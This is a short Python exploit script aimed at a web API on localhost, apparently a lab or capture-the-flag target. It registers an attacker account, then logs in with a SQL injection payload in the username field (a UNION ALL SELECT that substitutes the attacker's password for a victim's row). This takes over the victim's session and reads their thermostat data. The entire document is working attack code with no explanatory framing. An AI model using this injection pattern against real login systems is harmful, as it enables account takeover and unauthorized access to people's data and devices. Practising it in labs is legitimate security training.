#!/usr/bin/env python3
import requests

addr = "127.0.0.1"
port = 8000
url = "http://" + addr + ":" + str(port)
username = "hackername"
password = "hackerpass"
session = requests.session()
response = session.get(url+"/api/v1/profile")
hacked_username = response.json()[0]["username"]
try:
    session.post(url+"/api/v1/register", json={"username":username, "password":password})
except Exception as err:
    print(err)
data = {"username":"notexists' UNION ALL SELECT id,role,username,(SELECT password FROM users WHERE username = '" + username + "') as password FROM users WHERE username = '" + hacked_username +"'; --", "password":password}
print(data)
session.post(url+"/api/v1/login", json=data)
response = session.get(url+"/api/v1/thermostat")
print(response.json())
